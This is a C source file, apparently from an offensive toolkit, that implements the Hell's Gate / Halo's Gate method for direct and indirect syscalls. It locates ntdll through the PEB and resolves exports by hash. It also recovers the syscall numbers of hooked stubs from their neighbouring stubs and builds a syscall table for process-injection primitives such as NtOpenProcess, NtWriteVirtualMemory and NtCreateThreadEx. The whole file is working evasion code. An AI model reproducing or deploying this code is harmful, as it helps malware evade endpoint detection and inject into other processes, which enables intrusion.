#include "hellsgate.h"
#include "api_hash.h"
#include <intrin.h>

static BOOL ExtractSSN(PBYTE func_addr, PDWORD ssn) {
    if (func_addr[0] == 0x4C &&
        func_addr[1] == 0x8B &&
        func_addr[2] == 0xD1 &&
        func_addr[3] == 0xB8) {
        *ssn = *(DWORD *)(func_addr + 4);
        return TRUE;
    }
    return FALSE;
}

static PVOID FindSyscallGadget(PBYTE func_addr) {
    for (DWORD i = 0; i < 64; i++) {
        if (func_addr[i] == 0x0F && func_addr[i + 1] == 0x05 &&
            func_addr[i + 2] == 0xC3) {
            return &func_addr[i];
        }
    }
    return NULL;
}

PVOID GetNtdllBase(void) {
    PPEB2 peb = (PPEB2)__readgsqword(0x60);
    PPEB_LDR_DATA2 ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InLoadOrderModuleList;
    PLIST_ENTRY curr = head->Flink;

    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY2 entry = CONTAINING_RECORD(
            curr, LDR_DATA_TABLE_ENTRY2, InLoadOrderLinks);
        if (entry->BaseDllName.Buffer) {
            WCHAR name_lower[10] = { 0 };
            USHORT len = entry->BaseDllName.Length / sizeof(WCHAR);
            if (len == 9) {
                for (int i = 0; i < 9; i++) {
                    WCHAR c = entry->BaseDllName.Buffer[i];
                    name_lower[i] = (c >= L'A' && c <= L'Z') ? c + 32 : c;
                }
                if (name_lower[0] == L'n' && name_lower[1] == L't' &&
                    name_lower[2] == L'd' && name_lower[3] == L'l' &&
                    name_lower[4] == L'l' && name_lower[5] == L'.' &&
                    name_lower[6] == L'd' && name_lower[7] == L'l' &&
                    name_lower[8] == L'l') {
                    return entry->DllBase;
                }
            }
        }
        curr = curr->Flink;
    }
    return NULL;
}

BOOL ResolveSyscall(PVOID ntdll_base, DWORD func_hash, PSYSCALL_ENTRY entry) {
    PBYTE base = (PBYTE)ntdll_base;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD addr_table = (PDWORD)(base + exports->AddressOfFunctions);
    PDWORD name_table = (PDWORD)(base + exports->AddressOfNames);
    PWORD  ord_table  = (PWORD)(base + exports->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char *func_name = (char *)(base + name_table[i]);
        if (HashStringA(func_name) != func_hash)
            continue;

        PBYTE func_addr = base + addr_table[ord_table[i]];
        DWORD ssn = 0;

        if (ExtractSSN(func_addr, &ssn)) {
            entry->dwSSN = ssn;
            entry->pSyscallAddr = FindSyscallGadget(func_addr);
            return entry->pSyscallAddr != NULL;
        }

        for (WORD offset = 1; offset < 500; offset++) {
            if (ord_table[i] + offset < exports->NumberOfFunctions) {
                PBYTE neighbor = base + addr_table[ord_table[i] + offset];
                if (ExtractSSN(neighbor, &ssn)) {
                    entry->dwSSN = ssn - offset;
                    entry->pSyscallAddr = FindSyscallGadget(neighbor);
                    return entry->pSyscallAddr != NULL;
                }
            }
            if (ord_table[i] >= offset) {
                PBYTE neighbor = base + addr_table[ord_table[i] - offset];
                if (ExtractSSN(neighbor, &ssn)) {
                    entry->dwSSN = ssn + offset;
                    entry->pSyscallAddr = FindSyscallGadget(neighbor);
                    return entry->pSyscallAddr != NULL;
                }
            }
        }
        return FALSE;
    }
    return FALSE;
}

BOOL InitSyscallTable(PSYSCALL_TABLE table) {
    PVOID ntdll = GetNtdllBase();
    if (!ntdll) return FALSE;

    ZeroMemory(table, sizeof(SYSCALL_TABLE));

    struct { DWORD hash; PSYSCALL_ENTRY entry; } resolves[] = {
        { H_NTALLOCATEVIRTUALMEMORY,  &table->NtAllocateVirtualMemory },
        { H_NTPROTECTVIRTUALMEMORY,   &table->NtProtectVirtualMemory },
        { H_NTWRITEVIRTUALMEMORY,     &table->NtWriteVirtualMemory },
        { H_NTCREATETHREADEX,         &table->NtCreateThreadEx },
        { H_NTWAITFORSINGLEOBJECT,    &table->NtWaitForSingleObject },
        { H_NTFREEVIRTUALMEMORY,      &table->NtFreeVirtualMemory },
        { H_NTCLOSE,                  &table->NtClose },
        { H_NTOPENPROCESS,            &table->NtOpenProcess },
    };

    for (int i = 0; i < _countof(resolves); i++) {
        if (!ResolveSyscall(ntdll, resolves[i].hash, resolves[i].entry))
            return FALSE;
    }
    return TRUE;
}
